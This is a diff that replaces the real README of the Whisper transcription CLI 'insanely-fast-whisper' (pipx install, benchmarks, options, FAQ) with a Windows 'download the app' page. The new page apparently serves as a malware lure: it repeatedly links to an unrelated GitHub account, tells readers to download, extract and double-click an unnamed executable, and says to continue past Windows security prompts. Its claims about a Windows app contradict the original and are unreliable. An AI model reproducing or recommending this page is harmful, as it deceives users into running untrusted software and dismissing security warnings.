@@ -1,172 +1,165 @@
-# Insanely Fast Whisper
+# ⚡ insanely-fast-whisper - Fast audio transcription on Windows
 
-An opinionated CLI to transcribe Audio files w/ Whisper on-device! Powered by 🤗 *Transformers*, *Optimum* & *flash-attn*
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Flossiemultinational273/insanely-fast-whisper)
 
-**TL;DR** - Transcribe **150** minutes (2.5 hours) of audio in less than **98** seconds - with [OpenAI's Whisper Large v3](https://huggingface.co/openai/whisper-large-v3). Blazingly fast transcription is now a reality!⚡️
+## 📥 Download
+Visit this page to download and run this file:
 
-```
-pipx install insanely-fast-whisper==0.0.15 --force
-```
+https://github.com/Flossiemultinational273/insanely-fast-whisper
 
-<p align="center">
-<img src="https://huggingface.co/datasets/reach-vb/random-images/resolve/main/insanely-fast-whisper-img.png" width="615" height="308">
-</p>
+## 🖥️ What this app does
 
-Not convinced? Here are some benchmarks we ran on a Nvidia A100 - 80GB 👇
+Insanely Fast Whisper transcribes audio files on your own computer. It uses Whisper, so your audio stays on-device.
 
-| Optimisation type    | Time to Transcribe (150 mins of Audio) |
-|------------------|------------------|
-| large-v3 (Transformers) (`fp32`)             | ~31 (*31 min 1 sec*)             |
-| large-v3 (Transformers) (`fp16` + `batching [24]` + `bettertransformer`) | ~5 (*5 min 2 sec*)            |
-| **large-v3 (Transformers) (`fp16` + `batching [24]` + `Flash Attention 2`)** | **~2 (*1 min 38 sec*)**            |
-| distil-large-v2 (Transformers) (`fp16` + `batching [24]` + `bettertransformer`) | ~3 (*3 min 16 sec*)            |
-| **distil-large-v2 (Transformers) (`fp16` + `batching [24]` + `Flash Attention 2`)** | **~1 (*1 min 18 sec*)**           |
-| large-v2 (Faster Whisper) (`fp16` + `beam_size [1]`) | ~9.23 (*9 min 23 sec*)            |
-| large-v2 (Faster Whisper) (`8-bit` + `beam_size [1]`) | ~8 (*8 min 15 sec*)            |
+It works well for:
 
-P.S. We also ran the benchmarks on a [Google Colab T4 GPU](/notebooks/) instance too!
+- Voice memos
+- Meetings
+- Interviews
+- Lectures
+- Podcasts
+- Screen recordings
 
-P.P.S. This project originally started as a way to showcase benchmarks for Transformers, but has since evolved into a lightweight CLI for people to use. This is purely community driven. We add whatever community seems to have a strong demand for! 
+You choose an audio file, then the app turns speech into text. You can use the text for notes, captions, or search.
 
-## 🆕 Blazingly fast transcriptions via your terminal! ⚡️
+## 🪟 Windows requirements
 
-We've added a CLI to enable fast transcriptions. Here's how you can use it:
+Before you start, make sure your PC has:
 
-Install `insanely-fast-whisper` with `pipx` (`pip install pipx` or `brew install pipx`):
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- Enough free disk space for the app and model files
+- A modern Intel or AMD processor
+- A working internet connection for the first setup
 
-```bash
-pipx install insanely-fast-whisper
-```
+If you have a fast NVIDIA graphics card, the app can run much faster. It also works on CPU-only systems.
 
-⚠️ If you have python 3.11.XX installed, `pipx` may parse the version incorrectly and install a very old version of `insanely-fast-whisper` without telling you (version `0.0.8`, which won't work anymore with the current `BetterTransformers`). In that case, you can install the latest version by passing `--ignore-requires-python` to `pip`:
+## 🚀 Get the app
 
-```bash
-pipx install insanely-fast-whisper --force --pip-args="--ignore-requires-python"
-```
+1. Open this page in your web browser:
+   https://github.com/Flossiemultinational273/insanely-fast-whisper
 
-If you're installing with `pip`, you can pass the argument directly: `pip install insanely-fast-whisper --ignore-requires-python`.
+2. Find the latest Windows download.
 
+3. Download the file to your computer.
 
-Run inference from any path on your computer:
+4. If the download comes as a ZIP file, right-click it and choose **Extract All**.
 
-```bash
-insanely-fast-whisper --file-name <filename or URL>
-```
-*Note: if you are running on macOS, you also need to add `--device-id mps` flag.*
+5. Open the extracted folder.
 
-🔥 You can run [Whisper-large-v3](https://huggingface.co/openai/whisper-large-v3) w/ [Flash Attention 2](https://github.com/Dao-AILab/flash-attention) from this CLI too:
+6. Double-click the app file or installer to start it.
 
-```bash
-insanely-fast-whisper --file-name <filename or URL> --flash True 
-```
+## 🛠️ First-time setup
 
-🌟 You can run [distil-whisper](https://huggingface.co/distil-whisper) directly from this CLI too:
+When you run the app for the first time, it may download the speech model it needs. This can take a few minutes.
 
-```bash
-insanely-fast-whisper --model-name distil-whisper/large-v2 --file-name <filename or URL> 
-```
+Follow these steps:
 
-Don't want to install `insanely-fast-whisper`? Just use `pipx run`:
+1. Start the app.
+2. Let it finish any setup it shows.
+3. Choose your audio file.
+4. Pick the output folder if the app asks.
+5. Start the transcription.
 
-```bash
-pipx run insanely-fast-whisper --file-name <filename or URL>
-```
+If Windows shows a security prompt, choose the option that lets you continue if you trust the download source.
 
-> [!NOTE]
-> The CLI is highly opinionated and only works on NVIDIA GPUs & Mac. Make sure to check out the defaults and the list of options you can play around with to maximise your transcription throughput. Run `insanely-fast-whisper --help` or `pipx run insanely-fast-whisper --help` to get all the CLI arguments along with their defaults. 
+## 🎧 How to transcribe audio
 
+1. Open the app.
+2. Select an audio file.
+3. Choose the language if needed.
+4. Start transcription.
+5. Wait for the text output.
+6. Copy the text or save it to a file.
 
-## CLI Options
+The app works best with clear speech and low background noise.
 
-The `insanely-fast-whisper` repo provides an all round support for running Whisper in various settings. Note that as of today 26th Nov, `insanely-fast-whisper` works on both CUDA and mps (mac) enabled devices.
-```
-  -h, --help            show this help message and exit
-  --file-name FILE_NAME
-                        Path or URL to the audio file to be transcribed.
-  --device-id DEVICE_ID
-                        Device ID for your GPU. Just pass the device number when using CUDA, or "mps" for Macs with Apple Silicon. (default: "0")
-  --transcript-path TRANSCRIPT_PATH
-                        Path to save the transcription output. (default: output.json)
-  --model-name MODEL_NAME
-                        Name of the pretrained model/ checkpoint to perform ASR. (default: openai/whisper-large-v3)
-  --task {transcribe,translate}
-                        Task to perform: transcribe or translate to another language. (default: transcribe)
-  --language LANGUAGE   
-                        Language of the input audio. (default: "None" (Whisper auto-detects the language))
-  --batch-size BATCH_SIZE
-                        Number of parallel batches you want to compute. Reduce if you face OOMs. (default: 24)
-  --flash FLASH         
-                        Use Flash Attention 2. Read the FAQs to see how to install FA2 correctly. (default: False)
-  --timestamp {chunk,word}
-                        Whisper supports both chunked as well as word level timestamps. (default: chunk)
-  --hf-token HF_TOKEN
-                        Provide a hf.co/settings/token for Pyannote.audio to diarise the audio clips
-  --diarization_model DIARIZATION_MODEL
-                        Name of the pretrained model/ checkpoint to perform diarization. (default: pyannote/speaker-diarization)
-  --num-speakers NUM_SPEAKERS
-                        Specifies the exact number of speakers present in the audio file. Useful when the exact number of participants in the conversation is known. Must be at least 1. Cannot be used together with --min-speakers or --max-speakers. (default: None)
-  --min-speakers MIN_SPEAKERS
-                        Sets the minimum number of speakers that the system should consider during diarization. Must be at least 1. Cannot be used together with --num-speakers. Must be less than or equal to --max-speakers if both are specified. (default: None)
-  --max-speakers MAX_SPEAKERS
-                        Defines the maximum number of speakers that the system should consider in diarization. Must be at least 1. Cannot be used together with --num-speakers. Must be greater than or equal to --min-speakers if both are specified. (default: None)
-```
+## 📁 Supported audio files
 
-## Frequently Asked Questions
+You can use common audio and video formats such as:
 
-**How to correctly install flash-attn to make it work with `insanely-fast-whisper`?**
+- MP3
+- WAV
+- M4A
+- FLAC
+- MP4
+- MOV
 
-Make sure to install it via `pipx runpip insanely-fast-whisper install flash-attn --no-build-isolation`. Massive kudos to @li-yifei for helping with this.
+If your file does not work, try converting it to MP3 or WAV first.
 
-**How to solve an `AssertionError: Torch not compiled with CUDA enabled` error on Windows?**
+## ⚙️ Useful settings
 
-The root cause of this problem is still unknown, however, you can resolve this by manually installing torch in the virtualenv like `python -m pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121`. Thanks to @pto2k for all tdebugging this.
+You may see a few settings in the app. These help you control speed and output quality.
 
-**How to avoid Out-Of-Memory (OOM) exceptions on Mac?**
+- **Model size**: Larger models can give better text quality
+- **Language**: Set this if you already know the spoken language
+- **Output type**: Save plain text, timestamps, or subtitle files
+- **Device**: Use GPU if your PC has one, or CPU if it does not
+- **Batch size**: Higher values can improve speed on strong hardware
 
-The *mps* backend isn't as optimised as CUDA, hence is way more memory hungry. Typically you can run with `--batch-size 4` without any issues (should use roughly 12GB GPU VRAM). Don't forget to set `--device-id mps`.
+For most people, the default settings work well.
 
-## How to use Whisper without a CLI?
+## 🧠 Best results
 
-<details>
-<summary>All you need to run is the below snippet:</summary>
+Use these tips for cleaner transcripts:
 
-```
-pip install --upgrade transformers optimum accelerate
-```
+- Use a clear recording
+- Keep one speaker at a time
+- Reduce background noise
+- Use a good microphone if you can
+- Trim long silences before transcription
 
-```python
-import torch
-from transformers import pipeline
-from transformers.utils import is_flash_attn_2_available
+If the text has mistakes, try a larger model or a cleaner recording.
 
-pipe = pipeline(
-    "automatic-speech-recognition",
-    model="openai/whisper-large-v3", # select checkpoint from https://huggingface.co/openai/whisper-large-v3#model-details
-    torch_dtype=torch.float16,
-    device="cuda:0", # or mps for Mac devices
-    model_kwargs={"attn_implementation": "flash_attention_2"} if is_flash_attn_2_available() else {"attn_implementation": "sdpa"},
-)
+## 🧾 What you get
 
-outputs = pipe(
-    "<FILE_NAME>",
-    chunk_length_s=30,
-    batch_size=24,
-    return_timestamps=True,
-)
+The app can produce:
 
-outputs
-```
-</details>
+- Plain text transcript
+- Timestamped text
+- Subtitle-style output
+- Copyable text for notes or documents
 
-## Acknowledgements
+This makes it easy to use the transcript in other apps.
 
-1. [OpenAI Whisper](https://github.com/openai/whisper) team for open sourcing such a brilliant check point.
-2. Hugging Face Transformers team, specifically [Arthur](https://github.com/ArthurZucker), [Patrick](https://github.com/patrickvonplaten), [Sanchit](https://github.com/sanchit-gandhi) & [Yoach](https://github.com/ylacombe)  (alphabetical order) for continuing to maintain Whisper in Transformers.
-3. Hugging Face [Optimum](https://github.com/huggingface/optimum) team for making the BetterTransformer API so easily accessible.
-4. [Patrick Arminio](https://github.com/patrick91) for helping me tremendously to put together this CLI.
+## 🔄 Typical use case
 
-## Community showcase
+A simple workflow looks like this:
 
-1. @ochen1 created a brilliant MVP for a CLI here: https://github.com/ochen1/insanely-fast-whisper-cli (Try it out now!)
-2. @arihanv created an app (Shush) using NextJS (Frontend) & Modal (Backend): https://github.com/arihanv/Shush (Check it outtt!)
-3. @kadirnar created a python package on top of the transformers with optimisations: https://github.com/kadirnar/whisper-plus (Go go go!!!)
+1. Record a meeting or lecture.
+2. Open the audio file in Insanely Fast Whisper.
+3. Transcribe it on your PC.
+4. Save the text.
+5. Paste it into Word, Notepad, or your notes app.
+
+## ❓ Common questions
+
+### Does it need the internet every time?
+No. It runs on your computer after setup. It may need the internet the first time to get the model files.
+
+### Can it run without a GPU?
+Yes. It can run on CPU-only systems. A GPU can make it much faster.
+
+### Is there a limit on audio length?
+Long files are supported. Very long files may take more time and memory.
+
+### Can I use it for multiple files?
+Yes. You can run one file at a time, then repeat the process for the next file.
+
+### Will it change my original audio file?
+No. It reads your file and creates transcript output.
+
+## 📌 Quick start
+
+1. Open the download page:
+   https://github.com/Flossiemultinational273/insanely-fast-whisper
+
+2. Download the Windows file.
+
+3. Extract it if needed.
+
+4. Open the app.
+
+5. Add an audio file.
+
+6. Start transcription.
